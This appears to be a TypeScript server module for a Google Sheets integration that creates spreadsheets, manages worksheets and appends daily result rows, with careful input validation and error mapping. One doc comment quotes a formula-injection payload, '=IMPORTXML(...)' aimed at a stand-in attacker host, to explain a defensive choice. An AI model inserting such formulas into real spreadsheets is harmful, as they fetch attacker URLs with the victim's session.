import "server-only";

import { SHEET_COLUMN_COUNT, type SheetCell, headerRow } from "@/lib/sheet-rows";
import { AppError, validationFailed } from "@/server/errors";
import { spreadsheetIdSchema } from "@/validation/integration";

/**
 * The Google Sheets REST calls this integration makes. No client library — see the note in
 * `google-oauth.service.ts` for why.
 *
 * ## There is deliberately no "list the customer's spreadsheets" call
 *
 * The integration holds only the `drive.file` scope, which grants per-file access to spreadsheets
 * Routely created or the customer explicitly handed over through the Google Picker. A Drive
 * `files.list` under that scope returns only files *this app* created — so a picker built on it
 * would show a customer a list that pointedly excluded their own spreadsheets, which is worse than
 * no list at all. Browsing is the Picker's job, in Google's own window, using the customer's own
 * session. See `docs/INTEGRATIONS.md`.
 *
 * ## No SSRF guard here, on purpose
 *
 * `pixel.service.ts` wraps its `fetch` in `assertPublicHost`, a DNS lookup and a manual redirect
 * loop. **None of that belongs in this file**, and copying it here would be cargo cult: those
 * guards exist because that service fetches a *customer-supplied URL*, where the customer
 * controls the host and could aim it at a metadata endpoint or a private address. Here every host
 * is a compile-time constant and nothing user-supplied can change it. What the customer does
 * control is the spreadsheet id, which is validated against a strict character class and
 * percent-encoded before it reaches a URL path — that is the control that matters here.
 */

const SHEETS_ENDPOINT = "https://sheets.googleapis.com/v4/spreadsheets";

const FETCH_TIMEOUT_MS = 15_000;

/** Response bodies are small; a cap stops a malformed one exhausting memory. */
const MAX_BYTES = 1024 * 1024;

export interface WorksheetSummary {
  /** The tab's stable numeric id — its gid. What gets stored. */
  sheetId: number;
  title: string;
}

export interface SpreadsheetMetadata {
  spreadsheetId: string;
  spreadsheetName: string;
  worksheets: WorksheetSummary[];
}

export interface AppendResult {
  rowsWritten: number;
  /** The A1 range Google says it wrote, e.g. `Daily!A2:F7`. The only independent evidence. */
  updatedRange: string | null;
}

/**
 * One authenticated request to a Google API.
 *
 * Errors are mapped to `AppError` with sentences a customer can act on, because every one of them
 * surfaces in a toast or on the integrations page. The raw provider payload is never shown: it
 * leaks internal detail and tells the customer nothing they can use.
 */
async function googleFetch(
  url: string,
  accessToken: string,
  init: { method?: string; body?: unknown } = {},
): Promise<unknown> {
  let response: Response;

  try {
    response = await fetch(url, {
      method: init.method ?? "GET",
      headers: {
        Authorization: `Bearer ${accessToken}`,
        Accept: "application/json",
        "User-Agent": "Routely/1 (+https://routely.app)",
        ...(init.body === undefined ? {} : { "Content-Type": "application/json" }),
      },
      ...(init.body === undefined ? {} : { body: JSON.stringify(init.body) }),
      // A redirect from a Google API is a bug, not a hop to follow.
      redirect: "error",
      signal: AbortSignal.timeout(FETCH_TIMEOUT_MS),
    });
  } catch (error) {
    /*
     * A timeout or network failure on a *write* is the one case the caller must distinguish: the
     * request may have been applied. `TIMEOUT` is carried as the cause so `sheets-sync.service`
     * can record UNKNOWN rather than FAILED, and therefore never auto-retry a day that might
     * already be in the spreadsheet.
     */
    throw new AppError("INTERNAL", "Could not reach Google Sheets. Please try again.", {
      cause: "TIMEOUT",
      ...(error instanceof Error ? {} : {}),
    });
  }

  const text = await readCapped(response);

  if (!response.ok) {
    throw mapGoogleError(response.status, text);
  }

  if (text.length === 0) return {};

  try {
    return JSON.parse(text) as unknown;
  } catch {
    throw validationFailed("Google Sheets returned a response we could not read.");
  }
}

/** True when a failure means the write may or may not have landed. */
export function isIndeterminate(error: unknown): boolean {
  return error instanceof AppError && error.cause === "TIMEOUT";
}

/** True when the destination itself is gone and the stored target should be cleared. */
export function isMissingDestination(error: unknown): boolean {
  return error instanceof AppError && error.cause === "DESTINATION_GONE";
}

async function readCapped(response: Response): Promise<string> {
  const reader = response.body?.getReader();
  if (!reader) return "";

  const chunks: Uint8Array[] = [];
  let total = 0;

  try {
    for (;;) {
      const { done, value } = await reader.read();
      if (done) break;
      if (!value) continue;

      total += value.byteLength;
      if (total > MAX_BYTES) break;
      chunks.push(value);
    }
  } finally {
    await reader.cancel().catch(() => {});
  }

  return Buffer.concat(chunks.map((chunk) => Buffer.from(chunk))).toString("utf8");
}

function mapGoogleError(status: number, body: string): AppError {
  const message = (() => {
    try {
      const parsed = JSON.parse(body) as { error?: { message?: unknown } };
      return typeof parsed.error?.message === "string" ? parsed.error.message : "";
    } catch {
      return "";
    }
  })();

  if (status === 401) {
    // The caller refreshes once and retries; if it happens again the connection is marked as
    // needing a reconnect.
    return new AppError("UNAUTHENTICATED", "Google rejected the access token.", {
      cause: "UNAUTHORIZED",
    });
  }

  if (status === 403) {
    // Two very different causes share this status, and the customer's next action differs, so the
    // message distinguishes them by what Google said.
    if (/insufficient|scope/i.test(message)) {
      return new AppError(
        "FORBIDDEN",
        "Routely was not granted permission to use Google Sheets. Reconnect and accept all the requested permissions.",
        { cause: "INSUFFICIENT_SCOPE" },
      );
    }

    return new AppError(
      "FORBIDDEN",
      "You no longer have edit access to that spreadsheet. Check its sharing settings, or choose another.",
      { cause: "PERMISSION_DENIED" },
    );
  }

  if (status === 404) {
    return new AppError(
      "NOT_FOUND",
      "That spreadsheet no longer exists. Choose a new destination.",
      { cause: "DESTINATION_GONE" },
    );
  }

  if (status === 429) {
    return new AppError(
      "RATE_LIMITED",
      "Google Sheets is rate-limiting us. The next daily sync will retry.",
    );
  }

  if (status >= 500) {
    return new AppError(
      "INTERNAL",
      "Google Sheets is unavailable. The next daily sync will retry.",
    );
  }

  return validationFailed(
    message
      ? `Google Sheets refused the request: ${message}`
      : "Google Sheets refused the request.",
  );
}

// ---------------------------------------------------------------------------
// Sheets — metadata, header, append
// ---------------------------------------------------------------------------

/**
 * Percent-encodes a spreadsheet id for use in a URL path, after validating it.
 *
 * Both, not either. The id reaches a path segment of a Google API URL, so a value containing a
 * slash could address a different method than the one intended. The schema is the real control and
 * the encoding is the belt.
 */
function pathSafeSpreadsheetId(spreadsheetId: string): string {
  const parsed = spreadsheetIdSchema.safeParse(spreadsheetId);

  if (!parsed.success) {
    throw validationFailed("That does not look like a Google Sheets id.");
  }

  return encodeURIComponent(parsed.data);
}

/**
 * Builds an A1 range for a worksheet.
 *
 * The title is quoted and any apostrophe in it doubled, which is A1 notation's own escaping. A
 * customer tab named `Rai's data` is ordinary and would otherwise produce a malformed range — and
 * a malformed range is not a harmless error, because Sheets would resolve part of it.
 */
function a1Range(sheetTitle: string, columns: string): string {
  return `'${sheetTitle.replace(/'/g, "''")}'!${columns}`;
}

/**
 * Creates a spreadsheet in the customer's Drive and returns its first tab.
 *
 * Authorised by `drive.file` alone: a file this app creates is a file this app may then write to,
 * which is the whole reason the narrow scope is sufficient. The customer sees it in their Drive
 * immediately and can move, rename or share it freely — Routely addresses it by id, so none of
 * that breaks the sync.
 *
 * The first sheet is named rather than left as "Sheet1", because the tab title ends up in the A1
 * range of every write and a meaningful one makes a spreadsheet somebody else opens legible.
 */
export async function createSpreadsheet(
  accessToken: string,
  title: string,
  firstSheetTitle = "Routely daily",
): Promise<{ spreadsheetId: string; spreadsheetName: string; worksheet: WorksheetSummary }> {
  const payload = (await googleFetch(SHEETS_ENDPOINT, accessToken, {
    method: "POST",
    body: {
      properties: { title },
      sheets: [{ properties: { title: firstSheetTitle } }],
    },
  })) as {
    spreadsheetId?: unknown;
    properties?: { title?: unknown };
    sheets?: { properties?: { sheetId?: unknown; title?: unknown } }[];
  };

  const first = payload.sheets?.[0]?.properties;

  if (
    typeof payload.spreadsheetId !== "string" ||
    typeof first?.sheetId !== "number" ||
    typeof first.title !== "string"
  ) {
    // Google answered 2xx with something unusable. Failing here rather than storing a partial
    // destination keeps the customer from a sync that cannot work.
    throw validationFailed("Google created the spreadsheet but did not describe it. Please retry.");
  }

  return {
    spreadsheetId: payload.spreadsheetId,
    spreadsheetName:
      typeof payload.properties?.title === "string" ? payload.properties.title : title,
    worksheet: { sheetId: first.sheetId, title: first.title },
  };
}

/**
 * A spreadsheet's name and its grid tabs.
 *
 * Also the pre-write step that resolves a stored `gid` back to its current title: renaming a tab
 * in Sheets changes the title and notifies nobody, so writing to a remembered title would either
 * fail or — worse — hit a different tab that has since taken the name.
 */
export async function getSpreadsheetMetadata(
  accessToken: string,
  spreadsheetId: string,
): Promise<SpreadsheetMetadata> {
  const fields = "properties(title),sheets(properties(sheetId,title,index,sheetType))";
  const url = `${SHEETS_ENDPOINT}/${pathSafeSpreadsheetId(spreadsheetId)}?fields=${encodeURIComponent(fields)}`;

  const payload = (await googleFetch(url, accessToken)) as {
    properties?: { title?: unknown };
    sheets?: {
      properties?: { sheetId?: unknown; title?: unknown; index?: unknown; sheetType?: unknown };
    }[];
  };

  const worksheets = (payload.sheets ?? [])
    .map((sheet) => sheet.properties)
    // Only GRID tabs hold cells. A chart-only tab cannot be appended to, and offering one in the
    // picker would produce a failure the customer could not diagnose.
    .filter(
      (
        properties,
      ): properties is { sheetId: number; title: string; index: number; sheetType: string } =>
        typeof properties?.sheetId === "number" &&
        typeof properties.title === "string" &&
        (properties.sheetType === undefined || properties.sheetType === "GRID"),
    )
    .sort((a, b) => (a.index ?? 0) - (b.index ?? 0))
    .map((properties) => ({ sheetId: properties.sheetId, title: properties.title }));

  return {
    spreadsheetId,
    spreadsheetName:
      typeof payload.properties?.title === "string"
        ? payload.properties.title
        : "Untitled spreadsheet",
    worksheets,
  };
}

/**
 * The current title of one worksheet, by gid.
 *
 * Throws `DESTINATION_GONE` when the tab has been deleted, so the caller can clear the stored
 * destination and ask for a new one rather than failing the same way every night.
 */
export async function resolveWorksheetTitle(
  accessToken: string,
  spreadsheetId: string,
  sheetId: number,
): Promise<string> {
  const metadata = await getSpreadsheetMetadata(accessToken, spreadsheetId);
  const worksheet = metadata.worksheets.find((sheet) => sheet.sheetId === sheetId);

  if (!worksheet) {
    throw new AppError(
      "NOT_FOUND",
      "The worksheet you chose has been deleted. Choose a new destination.",
      { cause: "DESTINATION_GONE" },
    );
  }

  return worksheet.title;
}

/** Column letter for a 1-based index. Only ever called for the six columns this feature writes. */
function columnLetter(index: number): string {
  return String.fromCharCode("A".charCodeAt(0) + index - 1);
}

const LAST_COLUMN = columnLetter(SHEET_COLUMN_COUNT);

/**
 * Writes the header row if the worksheet does not already have one.
 *
 * Reads before writing rather than writing unconditionally, because the destination may be a tab
 * the customer already uses — overwriting row 1 of somebody's existing sheet would be destructive
 * and is exactly the kind of thing an integration must not do on its own.
 */
export async function ensureHeaderRow(
  accessToken: string,
  spreadsheetId: string,
  sheetTitle: string,
): Promise<{ written: boolean }> {
  const id = pathSafeSpreadsheetId(spreadsheetId);
  const range = a1Range(sheetTitle, `A1:${LAST_COLUMN}1`);
  const encodedRange = encodeURIComponent(range);

  const existing = (await googleFetch(
    `${SHEETS_ENDPOINT}/${id}/values/${encodedRange}?majorDimension=ROWS`,
    accessToken,
  )) as { values?: unknown[][] };

  const firstRow = existing.values?.[0] ?? [];
  const hasContent = firstRow.some((cell) => String(cell ?? "").trim().length > 0);

  if (hasContent) return { written: false };

  await googleFetch(
    `${SHEETS_ENDPOINT}/${id}/values/${encodedRange}?valueInputOption=RAW`,
    accessToken,
    {
      method: "PUT",
      body: { range, majorDimension: "ROWS", values: [headerRow()] },
    },
  );

  return { written: true };
}

/**
 * Creates a worksheet if the spreadsheet does not already have one by that title.
 *
 * Returns its gid either way. Used for the live tab, which Routely adds to whichever spreadsheet the
 * customer chose — including one of their existing ones, where adding a tab is the least invasive
 * thing that could possibly work: no existing tab is touched, and they can delete it without
 * breaking the daily history.
 */
export async function ensureWorksheet(
  accessToken: string,
  spreadsheetId: string,
  title: string,
): Promise<WorksheetSummary> {
  const metadata = await getSpreadsheetMetadata(accessToken, spreadsheetId);
  const existing = metadata.worksheets.find((sheet) => sheet.title === title);

  if (existing) return existing;

  const payload = (await googleFetch(
    `${SHEETS_ENDPOINT}/${pathSafeSpreadsheetId(spreadsheetId)}:batchUpdate`,
    accessToken,
    {
      method: "POST",
      body: { requests: [{ addSheet: { properties: { title } } }] },
    },
  )) as { replies?: { addSheet?: { properties?: { sheetId?: unknown; title?: unknown } } }[] };

  const created = payload.replies?.[0]?.addSheet?.properties;

  if (typeof created?.sheetId !== "number" || typeof created.title !== "string") {
    throw validationFailed("Google created the worksheet but did not describe it.");
  }

  return { sheetId: created.sheetId, title: created.title };
}

/**
 * Overwrites a worksheet with a header and rows, in a single request.
 *
 * `values.update`, not `append`: this tab shows *today*, and today changes. Appending would stack a
 * new copy of the same day every few seconds.
 *
 * `previousRowCount` is what stops stale rows lingering. Writing 3 rows over a tab that held 8 would
 * leave 5 orphans below the new data, still looking like results — so the range is padded with empty
 * rows out to whatever was there before. Padding in the same call keeps this to one write, which
 * matters because the write quota is per minute and this runs on live traffic.
 *
 * `RAW` for the same reason as everywhere else: an experiment name beginning with `=` must be a
 * string, not a formula.
 */
export async function overwriteWorksheet(
  accessToken: string,
  spreadsheetId: string,
  sheetTitle: string,
  rows: SheetCell[][],
  previousRowCount: number,
): Promise<{ rowsWritten: number }> {
  const header = headerRow();
  const body: SheetCell[][] = [header, ...rows];

  const blank: SheetCell[] = Array.from({ length: SHEET_COLUMN_COUNT }, () => "");
  for (let i = body.length; i < previousRowCount + 1; i += 1) body.push([...blank]);

  const range = a1Range(sheetTitle, `A1:${LAST_COLUMN}${Math.max(body.length, 1)}`);

  await googleFetch(
    `${SHEETS_ENDPOINT}/${pathSafeSpreadsheetId(spreadsheetId)}/values/${encodeURIComponent(range)}?valueInputOption=RAW`,
    accessToken,
    { method: "PUT", body: { range, majorDimension: "ROWS", values: body } },
  );

  return { rowsWritten: rows.length };
}

/**
 * Appends rows to a worksheet.
 *
 * `valueInputOption=RAW` is a security decision, not a formatting one. Under `USER_ENTERED`,
 * Google parses each value as though a person had typed it — so an experiment named
 * `=IMPORTXML("http://attacker.test", …)` would be stored as a **live formula** in the customer's
 * spreadsheet, fetching a URL of the attacker's choosing with the customer's Google session. The
 * experiment name is customer-controlled free text, so the only safe reading is literal. `RAW`
 * still stores JSON numbers as numbers, which is the one thing `USER_ENTERED` would otherwise
 * have been needed for.
 *
 * `insertDataOption=INSERT_ROWS` makes Google insert new rows rather than overwrite whatever
 * happens to sit below the table.
 */
export async function appendRows(
  accessToken: string,
  spreadsheetId: string,
  sheetTitle: string,
  rows: SheetCell[][],
): Promise<AppendResult> {
  if (rows.length === 0) return { rowsWritten: 0, updatedRange: null };

  const id = pathSafeSpreadsheetId(spreadsheetId);
  const range = a1Range(sheetTitle, `A:${LAST_COLUMN}`);

  const params = new URLSearchParams({
    valueInputOption: "RAW",
    insertDataOption: "INSERT_ROWS",
    includeValuesInResponse: "false",
  });

  const payload = (await googleFetch(
    `${SHEETS_ENDPOINT}/${id}/values/${encodeURIComponent(range)}:append?${params.toString()}`,
    accessToken,
    { method: "POST", body: { range, majorDimension: "ROWS", values: rows } },
  )) as { updates?: { updatedRows?: unknown; updatedRange?: unknown } };

  return {
    rowsWritten:
      typeof payload.updates?.updatedRows === "number" ? payload.updates.updatedRows : rows.length,
    updatedRange:
      typeof payload.updates?.updatedRange === "string" ? payload.updates.updatedRange : null,
  };
}
